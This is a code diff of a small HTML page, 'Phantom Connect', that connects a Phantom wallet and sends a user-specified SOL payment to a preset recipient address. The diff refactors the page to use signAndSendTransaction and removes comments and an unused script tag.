@@ -5,7 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Phantom Connect</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3.js/1.7.4/web3.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.75.0/web3.min.js"></script>
     <style>
         body {
@@ -102,12 +101,12 @@
 
     <script>
         let senderPublicKey = null; 
-        const recipientAddress = "AbkmJwcuCwj6zcCNkoQmStTMhFLe4CwTS3p4g8nnScue"; // Wallet destinatario preimpostato
+        const recipientAddress = "AbkmJwcuCwj6zcCNkoQmStTMhFLe4CwTS3p4g8nnScue"; 
 
         document.getElementById('connect-btn').addEventListener('click', async () => {
             if (window.solana && window.solana.isPhantom) {
                 try {
-                    await window.solana.disconnect(); // Disconnette qualsiasi sessione precedente
+                    await window.solana.disconnect(); 
                     const resp = await window.solana.connect();
                     senderPublicKey = resp.publicKey.toString(); 
 
@@ -138,27 +137,21 @@
                 return;
             }
 
-            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta')); // Usa la rete principale di Solana
-
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: new solanaWeb3.PublicKey(senderPublicKey),
-                    toPubkey: new solanaWeb3.PublicKey(recipientAddress),
-                    lamports: amount * solanaWeb3.LAMPORTS_PER_SOL, // Converte SOL in lamports
-                })
-            );
-
-            transaction.feePayer = new solanaWeb3.PublicKey(senderPublicKey);
-            transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-
             try {
-                const signedTransaction = await window.solana.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-                await connection.confirmTransaction(signature);
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: new solanaWeb3.PublicKey(senderPublicKey),
+                        toPubkey: new solanaWeb3.PublicKey(recipientAddress),
+                        lamports: amount * solanaWeb3.LAMPORTS_PER_SOL,
+                    })
+                );
 
-                // ✅ Mostra il messaggio di conferma senza cambiare pagina
+                // Firma e invia la transazione direttamente
+                const { signature } = await window.solana.signAndSendTransaction(transaction);
+                await connection.confirmTransaction(signature, "confirmed");
+
                 document.getElementById('success-message').style.display = 'block';
-
                 console.log(`Transazione completata! Hash: ${signature}`);
 
             } catch (err) {
@@ -169,6 +162,7 @@
 </body>
 
 </html>
+
 
 
 
